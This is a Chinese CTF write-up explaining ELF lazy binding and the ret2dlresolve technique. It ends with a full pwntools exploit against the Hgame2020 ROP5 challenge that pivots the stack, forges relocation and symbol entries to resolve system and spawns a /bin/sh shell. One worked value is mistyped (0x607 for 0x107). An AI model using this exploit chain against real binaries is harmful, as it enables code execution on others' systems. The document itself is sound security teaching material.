# 学习ret2dlresolve

参考资料：

[BruceFan's Blog](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)

[veritas501's Blog](veritas501.space/2017/10/07/ret2dl_resolve学习笔记/#more)

[看雪论坛g3n3rous的帖子](https://bbs.pediy.com/thread-253833.htm)

### 预备知识

#### 延迟绑定

> 程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。

让我们看看在程序执行执行call read@plt的时候到底发生了什么

got表分为.got表和.got.plt表，`.got`用来保存全局变量的引用地址。`.got.plt`用来保存函数引用的地址。

在第一次调用read之前

`.plt`：

```
---------------------------------
PLT0：
	push *(GOT+4)			//模块名压栈
	jmp *(GOT+8)			//跳转到_dl_runtime_resolve()
---------------------------------
	... ...
---------------------------------
read@plt:
	jmp *(read@got)			//首先跳转到该函数的GOT表项，判断是否是第一次调用 链接
	push n				//压入 需要地址绑定的符号 在重定位表.rel.plt中的下标（reloc_arg）
	jmp PLT0			//跳转到 PLT0
---------------------------------

```

`.got.plt`：

```
---------------------------------
.dynamic段地址
---------------------------------
链接器的标识信息（link_map）
---------------------------------
_dl_runtime_resolve()地址
---------------------------------

	... ...
			
---------------------------------
read@got:
	read@plt+6			//代指plt表中的"push n"这句
---------------------------------
```

当我们第一次调用read时，其对应的GOT表里并没有存放read的真实地址，而是`jmp *(read@got)`的下一条指令地址。

所以实际上程序第一次执行`jmp *(read@got)`的时候就相当于`nop`

程序继续执行，将该函数在重定位表`.rel.plt`中的下标和链接器的标识信息相继压栈，再跳转到执行_dl_runtime_resolve()

> 以上指令相当于执行了`_dl_runtime_resolve(link_map, reloc_arg)`，该函数会完成符号的解析，即将真实的write函数地址写入其GOT条目中，随后把控制权交给write函数。

#### 重定位流程

> 通过阅读_dl_fixup源码可以总结出一般的函数重定向流程可简略如下：
>
> 1.通过struct link_map **l获得.dynsym、.dynstr、.rel.plt地址
>
> 2.通过reloc_arg+.rel.plt地址取得函数对应的Elf32_Rel指针，记作reloc
>
> 3.通过reloc->r_info和.dynsym地址取得函数对应的Elf32_Sym指针，记作sym
>
> 4.检查r_info最低位是否为7
>
> 5.检查(sym->st_other)&0x03是否为0
>
> 6.通过strtab+sym->st_name获得函数对应的字符串，进行查找，找到后赋值给*rel_addr,最后调用这个函数

[_dl_fixup源码](https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#82)

下面以调用read函数作为演示

在进入_dl_runtime_resolve后，程序先在.dynamic节中找到JMPREL段

![dynamic](https://tva1.sinaimg.cn/large/00831rSTgy1gcxc08l6elj314y0qgaj1.jpg)

对应结构体为

```c
typedef struct
{
 Elf32_Sword  d_tag;      /*Dynamic entry type*/
 union
  {
   Elf32_Word d_val;      /*Integer value */
   Elf32_Addr d_ptr;      /*Address value */
  } d_un;
} Elf32_Dyn;
```

其中Tag对应着每个节，比如`JMPREL`对应着`.rel.plt`

再根据reloc_arg在JMPREL段相应偏移处找到write的Elf32_Rel结构体

`.rel.plt`节是用于函数重定位，`.rel.dyn`节是用于变量重定位

![JMPREL](https://tva1.sinaimg.cn/large/00831rSTgy1gcxiy8m9p2j314u0eags6.jpg)

所对应的结构体为

```c
typedef uint32_t Elf32_Addr;
typedef uint32_t Elf32_Word;
typedef struct
{
  Elf32_Addr    r_offset;               /* Address */
  Elf32_Word    r_info;                 /* Relocation type and symbol index */
} Elf32_Rel;
#define ELF32_R_SYM(val) ((val) >> 8) 

#define ELF32_R_TYPE(val) ((val) & 0xff)
```

所以这里read的r_offset为0x0804a00c，r_info为0x00000107

（`.dynsym`节包含了动态链接符号表  `.dynstr`节包含了动态链接的字符串）

根据定义 有

ELF32_R_SYM(0x607) = 0x107 >> 8 = 1 也就是read函数在`.dynsym`中的索引为1

ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT

`.dynsym`：

![.dynsym](https://tva1.sinaimg.cn/large/00831rSTgy1gcxjh1doqvj317o0e2dko.jpg)

这段内存为

![.dynsym](https://tva1.sinaimg.cn/large/00831rSTgy1gcxjipdqm7j315w0e6juj.jpg)

注意上图为小端序表示，即

`0x80481e8:  0x0000001a  0x00000000  0x00000000  0x00000012`

对应结构体为

```c
typedef struct
{
  Elf32_Word    st_name;   /* Symbol name (string tbl index) */
  Elf32_Addr    st_value;  /* Symbol value */
  Elf32_Word    st_size;   /* Symbol size */
  unsigned char st_info;   /* Symbol type and binding */
  unsigned char st_other;  /* Symbol visibility under glibc>=2.2 */
  Elf32_Section st_shndx;  /* Section index */
} Elf32_Sym;
```

`st_name`是  `.dynstr`中的偏移，程序根据偏移找到函数名称的字符串，也就是"read"

![.dynstr](https://tva1.sinaimg.cn/large/00831rSTgy1gcxkc9tfkej31140bmwir.jpg)

![偏移](https://tva1.sinaimg.cn/large/00831rSTgy1gcxkb2d2v4j30s0024aad.jpg)

再进行查找，找到后将函数真实地址保存在`.got.plt`的对应表项中，然后调用这个函数

另附上取自[veritas501's blog](veritas501.space/2017/10/07/ret2dl_resolve学习笔记/#more)的流程图

![流程图1](https://tva1.sinaimg.cn/large/00831rSTgy1gcxmbeomqpj319d0mgq5z.jpg)

![流程图2](http://img2.tan90.me/dl_resolve_8c8c7d866ba50da8775bfa9b12518cba.png)

### 漏洞利用

> 1.控制`eip`为PLT[0]的地址，只需传递一个`index_arg`参数
>
> 2.控制`index_arg`的大小，使`reloc`的位置落在可控地址内
>
> 3.伪造`reloc`的内容，使`sym`落在可控地址内
>
> 4.伪造`sym`的内容，使`name`落在可控地址内
>
> 5.伪造`name`为任意库函数，如`system`

以Hgame2020 week4的ROP5为例

例行检查

![checksec](https://tva1.sinaimg.cn/large/00831rSTgy1gcxmnq26x4j30ni05w75n.jpg)

ida打开

![ida](https://tva1.sinaimg.cn/large/00831rSTgy1gcxmnxhg1qj31c20u0gt7.jpg)

关闭了标准输出和标准错误，不能泄漏libc，且存在一处溢出

利用ret2dl_resolve

大致思路先进行栈迁移，让esp指向bss段，然后在bss段构造`index_offset`使其指向我们构造的`fake_reloc`，再构造特定的`r_info`让程序找到我们构造的`fake_sym`，从而控制`st_name`

需要注意的是，由于我们一般把这个构造的`.dynsym`表项写在`.bss`，所以fake符号表的偏移（`reloc->r_info`的前三个字节是符号表的偏移）太大，vernum这个数组就有可能越界，ndx可能为任何值，version处可能出现错误导致程序终止。

![源码](https://tva1.sinaimg.cn/large/00831rSTgy1gcxnjfgy3zj30tu05wwf4.jpg)

要让version为NULL，可以让ndx为0

（运气好的话，即使偏移很大，说不定version也能为NULL   运气游戏23333）

下面是我根据参考资料写的辣鸡脚本

```python
#!/usr/bin/env python2

# -*- coding: utf-8 -*-

from pwn import *

elf = ELF('ROP5')
offset = 72
read_plt = elf.plt['read']

ppp_ret = 0x080485d9 				# ROPgadget --binary ROP5 --only "pop|ret" #esi edi ebp 

pop_ebp_ret = 0x080485db
leave_ret = 0x08048458 				# ROPgadget --binary ROP5 --only "leave|ret"


cmd = "/bin/sh"
plt_0 = 0x08048380 				# objdump -d -j .plt ROP5

rel_plt = 0x08048330 				# objdump -s -j .rel.plt ROP5

stack_size = 0x200
bss_addr = elf.bss() 
base_stage = bss_addr + stack_size

puts_got = elf.got['puts'] 

dynsym = 0x080481d8 				#objdump -d -j .dynsym ROP5

dynstr = 0x08048278 				#objdump -d -j .dynstr ROP5

#################################################

index_offset = (base_stage + 28) - rel_plt
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
#################################################

versym = elf.dynamic_value_by_tag("DT_VERSYM")

while True:							#通过改变base_stage的方式来调整偏移，让ndx为0
	
	fake_ndx = u16(elf.read(versym+index_dynsym*2,2)) 	#ndx定义时与0x7fff按位与运算，故ndx应该为两个字节
	
	if fake_ndx != 0:
		base_stage += 0x10
		#################################################
		index_offset = (base_stage + 28) - rel_plt
		fake_sym_addr = base_stage + 36
		fake_sym_addr = fake_sym_addr + align
		index_dynsym = (fake_sym_addr - dynsym) / 0x10
		#################################################
		
		continue
	else :
		break 


r = process('./ROP5')
#r  = remote("47.103.214.163", 20700)

#gdb.attach(r,'b *0x0804855B')


r.recvuntil('Are you the LEVEL5?\n')
payload = 'A' * offset
payload += p32(read_plt) 				# 读100个字节到base_stage

payload += p32(ppp_ret)
payload += p32(0)
payload += p32(base_stage)
payload += p32(100)
payload += p32(pop_ebp_ret) 			
payload += p32(base_stage)
payload += p32(leave_ret) 				#进行栈迁移
payload += 'a'*152
r.send(payload)


r_info = (index_dynsym << 8) | 0x7 			#readelf -r ROP5

fake_reloc = p32(puts_got) + p32(r_info) 

st_name = (fake_sym_addr + 0x10) - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0) 		#p8(0) 绕过判断(sym->st_other)&0x03是否为0

payload2 = 'AAAA'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'AAAA'
payload2 += p32(base_stage + 80) 
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc 								# (base_stage+28)的位置
payload2 += 'B' * align
payload2 += fake_sym 								# (base_stage+36)的位置
payload2 += "system\x00"
payload2 += 'C' * (80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'A' * (100 - len(payload2))


r.sendline(payload2)

r.interactive()
```

运行脚本即可getshell

![shell](https://tva1.sinaimg.cn/large/00831rSTgy1gcxnzmxtnej30te0ak0vu.jpg)

之后进行输出重定位后即可`cat flag`，这里不再赘述

最后感谢**@PKFXXXX**关于ndx为2字节的解释
